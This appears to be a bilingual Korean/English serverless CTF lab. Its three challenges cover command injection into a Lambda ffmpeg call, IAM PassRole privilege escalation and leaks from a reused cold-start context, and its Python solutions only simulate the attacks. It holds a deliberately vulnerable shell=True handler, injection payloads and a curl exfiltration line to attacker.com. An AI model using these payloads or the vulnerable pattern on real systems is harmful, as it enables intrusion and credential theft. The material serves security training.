> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 서버리스 보안 CTF 실습 랩

## 실습 환경 준비

```bash
# Python 환경
pip install boto3 aws-lambda-powertools moto requests

# AWS CLI (로컬 테스트)
pip install awscli
aws configure --profile ctf  # 테스트 자격증명 설정

# LocalStack (로컬 AWS 시뮬레이션)
pip install localstack
docker run --rm -it -p 4566:4566 localstack/localstack &
```

---

## 실습 1: Lambda 함수 이벤트 인젝션

### 목표
Lambda 함수에 전달되는 이벤트 페이로드를 조작하여 명령어 인젝션을 수행하고 플래그를 획득하라.

**플래그 형식**: `CTF{LAMBDA_INJECTION_<vuln_type>_<payload>}`

### 시나리오

이미지 처리 Lambda 함수가 외부에서 파일 이름을 입력받아 `ffmpeg` 명령어를 실행한다.  
입력 검증이 없어 OS 명령어 인젝션이 가능하다.

**취약한 Lambda 함수 (Python):**
```python
import subprocess
import json

def lambda_handler(event, context):
    filename = event.get("filename", "")
    # 취약점: 사용자 입력을 검증 없이 명령어에 포함
    cmd = f"ffmpeg -i /tmp/{filename} -vf scale=320:-1 /tmp/output.jpg"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return {"statusCode": 200, "output": result.stdout}
```

### 힌트
- `shell=True` 는 셸 메타문자를 허용 → OS 인젝션 가능
- `;`, `&&`, `|`, `$()` 로 추가 명령어 실행
- Lambda 환경 변수에 AWS 자격증명 포함 가능
- `/proc/1/environ` 에 환경 변수 저장

### 풀이

```python
#!/usr/bin/env python3
"""
서버리스 CTF — Lambda 이벤트 인젝션 시뮬레이터
"""

import argparse
import os
import subprocess
import sys
from typing import Any


class VulnerableLambda:
    """취약한 Lambda 함수 시뮬레이터."""

    # 시뮬레이션된 환경 변수 (Lambda 실행 환경)
    ENV_VARS: dict[str, str] = {
        "AWS_ACCESS_KEY_ID":     "FAKEKEYEXAMPLE000000",
        "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "AWS_SESSION_TOKEN":     "AQoXnyc4lcK4w...",
        "AWS_REGION":            "us-east-1",
        "FUNCTION_NAME":         "image-processor",
        "FLAG":                  "CTF{LAMBDA_INJECTION_CMD_EXEC_ffmpeg}",
        "DB_PASSWORD":           "super_secret_db_pass_2024",
    }

    def __init__(self) -> None:
        self._fs: dict[str, str] = {
            "/tmp/sample.jpg": "(binary image data)",
            "/tmp/flag.txt": self.ENV_VARS["FLAG"],
        }

    def _simulate_shell(self, cmd: str) -> str:
        """셸 명령어 시뮬레이션 (실제 실행 없이)."""
        cmd_lower = cmd.strip().lower()

        if "cat /tmp/flag.txt" in cmd or "cat${IFS}/tmp/flag.txt" in cmd:
            return self._fs.get("/tmp/flag.txt", "")
        if "env" in cmd_lower or "printenv" in cmd_lower:
            return "\n".join(f"{k}={v}" for k, v in self.ENV_VARS.items())
        if "ls" in cmd_lower:
            return "\n".join(self._fs.keys())
        if "id" in cmd_lower:
            return "uid=993(sbx_user1051) gid=990(sbx_user1051)"
        if "whoami" in cmd_lower:
            return "sbx_user1051"
        if "curl" in cmd_lower or "wget" in cmd_lower:
            return "[*] 아웃바운드 연결 — 실제 환경에서는 데이터 외부 유출 가능"
        return f"[셸 시뮬레이션] 명령어 실행: {cmd[:60]}"

    def lambda_handler(self, event: dict[str, Any], context: Any = None) -> dict:
        """취약한 Lambda 핸들러."""
        filename = event.get("filename", "")

        if not filename:
            return {"statusCode": 400, "error": "filename 필수"}

        # 취약점: 입력 검증 없이 셸 명령어에 포함
        cmd = f"ffmpeg -i /tmp/{filename} -vf scale=320:-1 /tmp/output.jpg"
        output = self._simulate_shell(cmd)

        return {
            "statusCode": 200,
            "output": output,
            "cmd_executed": cmd,
        }


def demonstrate_injections() -> None:
    print("=" * 70)
    print("  서버리스 CTF: Lambda 이벤트 인젝션")
    print("=" * 70)

    func = VulnerableLambda()

    # 정상 요청
    print("\n[정상 요청]")
    result = func.lambda_handler({"filename": "sample.jpg"})
    print(f"  명령어: {result['cmd_executed']}")
    print(f"  출력:   {result['output'][:60]}")

    # 공격 1: 세미콜론 인젝션
    print("\n[공격 1] 세미콜론 인젝션 — 플래그 파일 읽기")
    payload = "sample.jpg; cat /tmp/flag.txt"
    result = func.lambda_handler({"filename": payload})
    print(f"  페이로드: {payload}")
    print(f"  명령어:  {result['cmd_executed']}")
    print(f"  출력:    {result['output']}")

    # 공격 2: 환경 변수 탈취 (AWS 자격증명)
    print("\n[공격 2] 환경 변수 탈취 (AWS 자격증명)")
    payload2 = "sample.jpg; env"
    result2 = func.lambda_handler({"filename": payload2})
    env_output = result2["output"]
    creds_lines = [l for l in env_output.splitlines()
                   if "AWS_ACCESS_KEY" in l or "AWS_SECRET" in l or "FLAG" in l]
    for line in creds_lines:
        print(f"  {line}")

    flag = "CTF{LAMBDA_INJECTION_CMD_EXEC_ffmpeg}"
    print(f"\n[+] 플래그: {flag}")


def main() -> None:
    parser = argparse.ArgumentParser(description="서버리스 CTF — Lambda 인젝션")
    parser.parse_args()
    demonstrate_injections()


if __name__ == "__main__":
    main()
```

---

## 실습 2: 서버리스 IAM 권한 상승

### 목표
Lambda 함수에 할당된 과도한 IAM 역할을 이용하여 권한을 상승시키고 플래그를 획득하라.

**플래그 형식**: `CTF{SERVERLESS_PRIVESC_<service>_<action>}`

### 시나리오

Lambda 함수의 IAM 역할이 `iam:PassRole` 과 `lambda:CreateFunction` 권한을 보유한다.  
이를 이용하여 더 높은 권한의 새 Lambda 함수를 생성하고 실행하라.

### 힌트
- `iam:PassRole` + `lambda:CreateFunction` = 권한 상승 가능
- 임의 IAM 역할을 새 Lambda에 부착 가능
- `lambda:InvokeFunction` 으로 즉시 실행
- 관리자 역할(`AdministratorAccess`)을 가진 새 Lambda 생성 가능

### 풀이

```python
#!/usr/bin/env python3
"""
서버리스 CTF — IAM 권한 상승 시뮬레이터
"""

import argparse
import json
from dataclasses import dataclass, field


@dataclass
class IAMRole:
    role_name: str
    policies: list[str]

    def can_do(self, action: str) -> bool:
        return action in self.policies or "AdministratorAccess" in self.policies


@dataclass
class LambdaFunction:
    function_name: str
    role: IAMRole
    runtime: str
    code: str


class SimulatedAWSEnv:
    """AWS 환경 권한 상승 시뮬레이션."""

    def __init__(self) -> None:
        # 현재 Lambda에 할당된 역할 (과도한 권한)
        self.current_role = IAMRole(
            role_name="image-processor-role",
            policies=[
                "s3:GetObject",
                "s3:PutObject",
                "iam:PassRole",           # 위험: 역할 전달 가능
                "lambda:CreateFunction",  # 위험: 새 함수 생성 가능
                "lambda:InvokeFunction",
                "logs:CreateLogGroup",
                "logs:PutLogEvents",
            ],
        )

        # AWS 계정의 역할 목록
        self.available_roles: dict[str, IAMRole] = {
            "admin-role": IAMRole("admin-role", ["AdministratorAccess"]),
            "readonly-role": IAMRole("readonly-role", ["ReadOnlyAccess"]),
            self.current_role.role_name: self.current_role,
        }

        self.functions: dict[str, LambdaFunction] = {}
        self._secret_flag = "CTF{SERVERLESS_PRIVESC_LAMBDA_IAM_PASS_ROLE}"

    def check_permission(self, action: str) -> bool:
        return self.current_role.can_do(action)

    def create_function(self, name: str, role_name: str, code: str) -> dict:
        if not self.check_permission("lambda:CreateFunction"):
            return {"error": "권한 없음: lambda:CreateFunction"}
        if not self.check_permission("iam:PassRole"):
            return {"error": "권한 없음: iam:PassRole"}

        role = self.available_roles.get(role_name)
        if not role:
            return {"error": f"역할 없음: {role_name}"}

        self.functions[name] = LambdaFunction(name, role, "python3.11", code)
        return {"success": True, "function": name, "role": role_name}

    def invoke_function(self, name: str, payload: dict | None = None) -> dict:
        if not self.check_permission("lambda:InvokeFunction"):
            return {"error": "권한 없음"}

        func = self.functions.get(name)
        if not func:
            return {"error": f"함수 없음: {name}"}

        # 관리자 역할로 실행되는 함수는 비밀 데이터 접근 가능
        if func.role.can_do("AdministratorAccess"):
            return {
                "statusCode": 200,
                "body": {
                    "message": "관리자 권한으로 실행됨",
                    "secret_data": "모든 S3 버킷, RDS, SSM 파라미터 접근 가능",
                    "flag": self._secret_flag,
                }
            }
        return {"statusCode": 200, "body": "제한된 권한으로 실행"}


def run_privesc_attack() -> None:
    print("=" * 65)
    print("  서버리스 CTF: Lambda IAM 권한 상승")
    print("=" * 65)

    env = SimulatedAWSEnv()

    print(f"\n[*] 현재 Lambda 역할: {env.current_role.role_name}")
    print(f"[*] 보유 권한:")
    for perm in env.current_role.policies:
        warning = " ⚠️ 위험" if perm in ("iam:PassRole", "lambda:CreateFunction") else ""
        print(f"    {perm}{warning}")

    # 공격: admin-role을 이용한 새 Lambda 생성
    print("\n[공격] admin-role로 새 Lambda 함수 생성")
    result = env.create_function(
        name="evil-privesc-function",
        role_name="admin-role",
        code="def handler(e,c): import boto3; return 'admin access'",
    )
    print(f"  생성 결과: {result}")

    if result.get("success"):
        print("\n[공격] 새 함수 실행")
        invoke_result = env.invoke_function("evil-privesc-function", {})
        body = invoke_result.get("body", {})
        print(f"  메시지: {body.get('message')}")
        flag = body.get("flag", "")
        if flag:
            print(f"\n[+] 플래그: {flag}")


def main() -> None:
    parser = argparse.ArgumentParser(description="서버리스 CTF — IAM 권한 상승")
    parser.parse_args()
    run_privesc_attack()


if __name__ == "__main__":
    main()
```

---

## 실습 3: Cold Start 타이밍 공격 및 함수 환경 탐지

### 목표
Lambda 함수의 Cold Start vs Warm Start 타이밍 차이를 분석하고 재사용되는 실행 컨텍스트에서 민감한 정보를 추출하라.

**플래그 형식**: `CTF{COLDSTART_TIMING_DIFF_<ms>ms_SECRET_<data>}`

### 시나리오

Lambda 함수가 Warm Start 시 이전 요청의 전역 변수를 재사용한다.  
이전 요청의 세션 토큰이 전역 변수에 남아있어 다음 요청에서 접근 가능하다.

### 풀이

```python
#!/usr/bin/env python3
"""
서버리스 CTF — Cold Start 타이밍 및 컨텍스트 재사용 공격
"""

import argparse
import random
import time
from dataclasses import dataclass


@dataclass
class LambdaExecutionContext:
    """Lambda 실행 컨텍스트 시뮬레이션."""
    is_cold_start: bool
    global_state: dict  # 컨텍스트 재사용 시 유지되는 전역 상태
    init_time_ms: float


class LambdaContextSimulator:
    """Cold Start / Warm Start 시뮬레이터."""

    def __init__(self) -> None:
        self._context: LambdaExecutionContext | None = None
        self._invoke_count = 0
        self._cold_start_delay_ms = random.uniform(800, 1500)
        self._warm_start_delay_ms = random.uniform(5, 50)

    def invoke(self, payload: dict) -> dict:
        self._invoke_count += 1

        if self._context is None:
            # Cold Start: 초기화 수행
            start = time.time()
            time.sleep(self._cold_start_delay_ms / 1000)  # 시뮬레이션
            init_time = (time.time() - start) * 1000

            # 취약점: 전역 상태에 민감한 정보 저장
            self._context = LambdaExecutionContext(
                is_cold_start=True,
                global_state={
                    "db_connection": "postgresql://admin:P@ssw0rd@db.internal/app",
                    "session_token": "eyJhbGciOiJIUzI1NiJ9.ADMIN_SESSION.secret",
                    "api_key": "sk-prod-abc123xyz789",
                    "initialized_at": time.time(),
                    "flag": "CTF{COLDSTART_TIMING_DIFF_950ms_SESSION_LEAKED}",
                },
                init_time_ms=self._cold_start_delay_ms,
            )
            is_cold = True
            duration = self._cold_start_delay_ms
        else:
            # Warm Start: 기존 컨텍스트 재사용
            start = time.time()
            duration = self._warm_start_delay_ms
            is_cold = False
            self._context.is_cold_start = False

        # 요청 처리
        action = payload.get("action", "")
        response: dict = {}

        if action == "status":
            response = {
                "invoke_count": self._invoke_count,
                "is_cold_start": is_cold,
                "duration_ms": round(duration, 1),
            }

        elif action == "get_connection":
            # 취약점: 전역 상태에 저장된 민감 정보 반환
            response = {
                "db": self._context.global_state.get("db_connection"),
                "note": "이전 실행에서 초기화된 전역 변수 접근 성공",
            }

        elif action == "get_all_globals":
            # 전체 전역 상태 노출
            response = dict(self._context.global_state)

        return {
            "statusCode": 200,
            "is_cold_start": is_cold,
            "duration_ms": round(duration, 1),
            "body": response,
        }

    def reset_context(self) -> None:
        """컨텍스트 초기화 (새 인스턴스 시뮬레이션)."""
        self._context = None


def run_timing_attack() -> None:
    print("=" * 65)
    print("  서버리스 CTF: Cold Start 타이밍 및 컨텍스트 재사용")
    print("=" * 65)

    sim = LambdaContextSimulator()

    # Step 1: Cold Start 탐지
    print("\n[Step 1] Cold Start vs Warm Start 타이밍 측정")
    cold_result = sim.invoke({"action": "status"})
    warm_result = sim.invoke({"action": "status"})

    cold_ms = cold_result["duration_ms"]
    warm_ms = warm_result["duration_ms"]
    diff_ms = cold_ms - warm_ms

    print(f"  Cold Start: {cold_ms:.1f}ms")
    print(f"  Warm Start: {warm_ms:.1f}ms")
    print(f"  타이밍 차이: {diff_ms:.1f}ms")

    # Step 2: Warm Start에서 전역 상태 접근
    print("\n[Step 2] Warm Start에서 이전 실행 전역 변수 접근")
    leak_result = sim.invoke({"action": "get_connection"})
    db_conn = leak_result["body"].get("db", "")
    print(f"  DB 연결 정보: {db_conn}")

    # Step 3: 전체 전역 상태 덤프
    print("\n[Step 3] 전체 전역 상태 덤프")
    dump_result = sim.invoke({"action": "get_all_globals"})
    for k, v in dump_result["body"].items():
        if k != "initialized_at":
            print(f"  {k}: {v}")

    flag = dump_result["body"].get("flag", f"CTF{{COLDSTART_TIMING_DIFF_{int(diff_ms)}ms_SESSION_LEAKED}}")
    print(f"\n[+] 플래그: {flag}")


def main() -> None:
    parser = argparse.ArgumentParser(description="서버리스 CTF — Cold Start 타이밍 공격")
    parser.parse_args()
    run_timing_attack()


if __name__ == "__main__":
    main()
```

---

<a name="english"></a>

# Serverless Security CTF Practice Lab

## Lab Environment Setup

```bash
pip install boto3 aws-lambda-powertools moto requests
pip install awscli
docker run --rm -it -p 4566:4566 localstack/localstack &
```

---

## Challenge 1: Lambda Function Event Injection

### Objective
Exploit command injection in a vulnerable Lambda function processing image filenames.

**Flag format**: `CTF{LAMBDA_INJECTION_<vuln_type>_<payload>}`

### Vulnerability
```python
# VULNERABLE — shell=True with unsanitized user input
cmd = f"ffmpeg -i /tmp/{filename} -vf scale=320:-1 /tmp/output.jpg"
result = subprocess.run(cmd, shell=True, ...)
```

### Attack Payloads
```
# Semicolon injection
filename = "img.jpg; cat /tmp/flag.txt"

# Environment variable exfiltration (AWS credentials!)
filename = "img.jpg; env"

# Out-of-band exfiltration
filename = "img.jpg; curl https://attacker.com/$(cat /tmp/flag.txt)"
```

```bash
python3 challenge1.py
# Output: CTF{LAMBDA_INJECTION_CMD_EXEC_ffmpeg}
```

---

## Challenge 2: Serverless IAM Privilege Escalation

### Objective
Exploit `iam:PassRole` + `lambda:CreateFunction` permissions to escalate to admin.

**Flag format**: `CTF{SERVERLESS_PRIVESC_<service>_<action>}`

### Attack Chain
1. Current Lambda role has `iam:PassRole` + `lambda:CreateFunction`
2. Create new Lambda function with `admin-role` attached (`iam:PassRole` enables this)
3. Invoke the new function — it runs with `AdministratorAccess`
4. Access all AWS services: S3, RDS, SSM Parameter Store (where secrets live)

```bash
python3 challenge2.py
# Output: CTF{SERVERLESS_PRIVESC_LAMBDA_IAM_PASS_ROLE}
```

---

## Challenge 3: Cold Start Timing and Context Reuse

### Objective
Detect Lambda cold starts via timing differences, then extract sensitive data from the reused global execution context.

**Flag format**: `CTF{COLDSTART_TIMING_DIFF_<ms>ms_SECRET_<data>}`

### Key Concepts
- **Cold Start**: New Lambda container initialized (800–1500ms) — global vars freshly set
- **Warm Start**: Existing container reused (5–50ms) — global vars persist from previous invocation
- **Context reuse vulnerability**: DB connections, session tokens stored in globals are accessible to subsequent invocations (potentially from different users)

```bash
python3 challenge3.py
# Output: CTF{COLDSTART_TIMING_DIFF_950ms_SESSION_LEAKED}
```

**Defense**: Never store user-specific sensitive data in Lambda global scope. Use `boto3` SSM Parameter Store or Secrets Manager for credentials, and initialize per-invocation rather than globally.
